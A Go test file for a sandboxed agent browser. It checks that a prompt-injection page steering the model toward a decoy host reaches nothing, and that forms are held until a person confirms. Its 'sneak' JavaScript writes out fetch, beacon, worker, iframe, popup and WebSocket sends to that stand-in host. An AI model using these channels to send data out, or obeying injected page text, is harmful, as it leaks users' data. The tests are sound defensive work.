package reed_test

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/heedle-ai/reed"
)

// courseSites starts the course (forms-srv) and a decoy host (decoy-srv)
// on a fresh Podman network, and returns the network, what the course
// says each form received, and how many requests the decoy got.
func courseSites(t *testing.T) (network string, check func(form string) courseCheck, hits func() int) {
	t.Helper()
	if _, err := exec.LookPath("podman"); err != nil {
		t.Skip("no podman")
	}
	dir := t.TempDir()
	buildCourseServer(t, dir)
	if out, err := exec.Command("cp", "-r", "testdata/forms", filepath.Join(dir, "forms")).CombinedOutput(); err != nil {
		t.Fatalf("%v %s", err, out)
	}
	os.WriteFile(filepath.Join(dir, "Containerfile"), []byte("FROM scratch\nCOPY server /server\nCOPY forms /forms\nENTRYPOINT [\"/server\"]\n"), 0o644)
	img := podman(t, "build", "--quiet", dir)
	network = fmt.Sprintf("reed-course-%d", time.Now().UnixNano())
	podman(t, "network", "create", network)
	t.Cleanup(func() {
		exec.Command("podman", "rm", "-f", "-t", "0", network+"-forms", network+"-decoy").Run()
		exec.Command("podman", "network", "rm", "-f", network).Run()
	})
	podman(t, "run", "-d", "--rm", "--name", network+"-forms", "--network", network, "--network-alias", "forms-srv", "--network-alias", "other-srv",
		"-e", "COURSE_TOKEN=t0ken", "--publish", "127.0.0.1::8080", img, "course", "/forms")
	podman(t, "run", "-d", "--rm", "--name", network+"-decoy", "--network", network, "--network-alias", "decoy-srv", "--publish", "127.0.0.1::8080", img, "decoy")
	client := &http.Client{Transport: &http.Transport{Proxy: nil}}
	get := func(name, path string) []byte {
		addr := strings.Split(podman(t, "port", name, "8080/tcp"), "\n")[0]
		for i := 0; i < 100; i++ {
			if res, err := client.Get("http://" + addr + path); err == nil {
				b, _ := io.ReadAll(res.Body)
				res.Body.Close()
				return b
			}
			time.Sleep(100 * time.Millisecond)
		}
		t.Fatalf("%s unreachable", name)
		return nil
	}
	check = func(form string) courseCheck {
		var c courseCheck
		json.Unmarshal(get(network+"-forms", "/check/"+form+"?token=t0ken"), &c)
		return c
	}
	hits = func() int {
		var n int
		fmt.Sscan(string(get(network+"-decoy", "/hits")), &n)
		return n
	}
	check("contact")
	hits()
	return network, check, hits
}

// TestContainer_CourseInjectionReachesNothing: the course's injection
// form, filled and sent in an act session as Claude would (by hand here),
// reaches its own server, while the decoy host its page asks for (text
// addressed to the model, an image and a script's request) and Playwright
// navigating there by name receive nothing. (Roadmap 9.6.)
func TestContainer_CourseInjectionReachesNothing(t *testing.T) {
	img := testActBrowser(t)
	network, check, hits := courseSites(t)
	s, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/injection/"})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	cs := mcpSession(t, s)
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/injection/"})
	snap, _ := call(t, cs, "browser_snapshot", nil)
	if !strings.Contains(snap, "decoy-srv") {
		t.Fatalf("the page doesn't try to steer:\n%s", snap)
	}
	if text, isErr := call(t, cs, "browser_fill_form", map[string]any{"fields": []map[string]any{
		{"name": "Feedback", "type": "textbox", "target": ref(t, snap, `textbox "Feedback"`), "value": "Great workshop, thank you."},
		{"name": "Rating", "type": "textbox", "target": ref(t, snap, `spinbutton "Rating (1 to 5)"`), "value": "5"},
	}}); isErr {
		t.Fatal(text)
	}
	call(t, cs, "browser_run_code_unsafe", map[string]any{"code": reed.ReleaseJS}) // a person confirmed (roadmap 9.7)
	call(t, cs, "browser_click", map[string]any{"element": "Send feedback", "target": ref(t, snap, `button "Send feedback"`)})
	if text, isErr := call(t, cs, "browser_navigate", map[string]any{"url": "http://decoy-srv:8080/collect"}); !isErr {
		t.Errorf("navigating to the decoy worked:\n%s", text)
	}
	time.Sleep(time.Second)
	if c := check("injection"); !c.Done {
		t.Errorf("the form's server got %v", c.Received)
	}
	if n := hits(); n != 0 {
		t.Fatalf("the decoy received %d requests", n)
	}
	// The control (review 40): allowed, the decoy is reached, so a zero
	// above means blocked, not unreachable.
	d, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://decoy-srv:8080/control"})
	if err != nil {
		t.Fatal(err)
	}
	defer d.Close()
	call(t, mcpSession(t, d), "browser_navigate", map[string]any{"url": "http://decoy-srv:8080/control"})
	if n := hits(); n == 0 {
		t.Fatal("the decoy can't be reached even when allowed: the test proves nothing")
	}
}

// TestContainer_ActHoldsFormsUntilConfirmed: in an act session the
// browser sends no form until a confirmation opens the way (ReleaseJS):
// submitting the course's contact form reaches nothing and is counted as
// held; once released, the same submission arrives; after that page
// loads, the hold is back. Lifted for the session (SendWithoutAsking),
// nothing is held. (Roadmap 9.7: nothing can submit the final form
// without a confirmation.)
func TestContainer_ActHoldsFormsUntilConfirmed(t *testing.T) {
	img := testActBrowser(t)
	network, check, hits := courseSites(t)
	s, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/contact/"})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	cs := mcpSession(t, s)
	run := func(code string) string {
		t.Helper()
		out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": code})
		if isErr {
			t.Fatalf("%s: %s", code, out)
		}
		return out
	}
	// send fills the contact form and clicks Send; between the two, a
	// person may confirm (ReleaseJS just before the click, as pirn runs
	// it), and the way closes after it (CloseJS).
	send := func(release bool) {
		t.Helper()
		call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/contact/"})
		snap, _ := call(t, cs, "browser_snapshot", nil)
		call(t, cs, "browser_fill_form", map[string]any{"fields": []map[string]any{
			{"name": "Full name", "type": "textbox", "target": ref(t, snap, `textbox "Full name"`), "value": "Ada Lovelace"},
			{"name": "Email", "type": "textbox", "target": ref(t, snap, `textbox "Email"`), "value": "ada@example.org"},
			{"name": "Phone", "type": "textbox", "target": ref(t, snap, `textbox "Phone"`), "value": "020 7946 0018"},
			{"name": "Message", "type": "textbox", "target": ref(t, snap, `textbox "Message"`), "value": "Please call me back."},
		}})
		if release {
			run(reed.ReleaseJS)
		}
		call(t, cs, "browser_click", map[string]any{"element": "Send", "target": ref(t, snap, `button "Send"`)})
		if release {
			run(reed.CloseJS)
		}
	}
	send(false)
	if c := check("contact"); len(c.Received) != 0 {
		t.Fatalf("sent without a confirmation: %v", c.Received)
	}
	if held := run(reed.HeldJS); !strings.Contains(held, `"total":1`) || !strings.Contains(held, "POST http://forms-srv:8080/contact/submit") {
		t.Errorf("held: %s", held)
	}
	send(true)
	if c := check("contact"); !c.Done || len(c.Received) != 1 {
		t.Fatalf("not sent once released: %v", c.Received)
	}
	send(false) // closed after the click: held again
	if c := check("contact"); len(c.Received) != 1 {
		t.Fatalf("sent twice on one confirmation: %v", c.Received)
	}
	// Review 41: a confirmation doesn't carry over to another page: the
	// main frame loading one closes the way.
	run(reed.ReleaseJS)
	send(false)
	if c := check("contact"); len(c.Received) != 1 {
		t.Fatalf("a confirmation carried over to another page: %v", c.Received)
	}

	// Review 41: every other way a page sends is held too: fetch, a
	// beacon, a worker, a form in a frame or a popup, and a WebSocket's
	// messages. A session that may reach the decoy shows it: the decoy
	// counts every request it gets.
	other, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/contact/", Allow: []string{"decoy-srv"}})
	if err != nil {
		t.Fatal(err)
	}
	defer other.Close()
	cs = mcpSession(t, other)
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/contact/"})
	before := hits()
	sneak := `async (page) => { await page.evaluate(async () => {
  const d = "http://decoy-srv:8080";
  fetch(d + "/fetch", { method: "POST", body: "a=1", mode: "no-cors" }).catch(() => {});
  navigator.sendBeacon(d + "/beacon", "a=1");
  new Worker(URL.createObjectURL(new Blob(["fetch('" + d + "/worker', { method: 'POST', body: 'a=1', mode: 'no-cors' }).catch(() => {})"])));
  const f = document.createElement("iframe");
  f.srcdoc = "<form method=post action=" + d + "/frame><input name=a value=1></form><script>document.forms[0].submit()</script>";
  document.body.append(f);
  const w = window.open("");
  if (w) { w.document.write("<form method=post action=" + d + "/popup><input name=a value=1></form>"); w.document.forms[0].submit(); }
  const ws = new WebSocket("ws://decoy-srv:8080/ws");
  ws.onopen = () => ws.send("a=1");
  await new Promise((r) => setTimeout(r, 3000));
}); return "done"; }`
	run(sneak)
	if n := hits() - before; n != 0 {
		t.Errorf("the decoy got %d requests while the hold was on", n)
	}
	if held := run(reed.HeldJS); !strings.Contains(held, "/fetch") || !strings.Contains(held, "/beacon") || !strings.Contains(held, "/worker") || !strings.Contains(held, "/frame") {
		t.Errorf("held: %s", held)
	}
	// The control: released, a fetch reaches the decoy, so a zero above
	// means held, not unreachable.
	run(reed.ReleaseJS)
	run(`async (page) => { await page.evaluate(() => fetch("http://decoy-srv:8080/control", { method: "POST", body: "a=1", mode: "no-cors" })); return "done"; }`)
	run(reed.CloseJS)
	if hits() == before {
		t.Error("the decoy can't be reached even when released: the test proves nothing")
	}

	free, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/contact/"})
	if err != nil {
		t.Fatal(err)
	}
	defer free.Close()
	if err := free.SendWithoutAsking(ctx); err != nil {
		t.Fatal(err)
	}
	cs = mcpSession(t, free)
	send(false)
	if c := check("contact"); len(c.Received) != 2 {
		t.Fatalf("held although lifted for the session: %v", c.Received)
	}
}
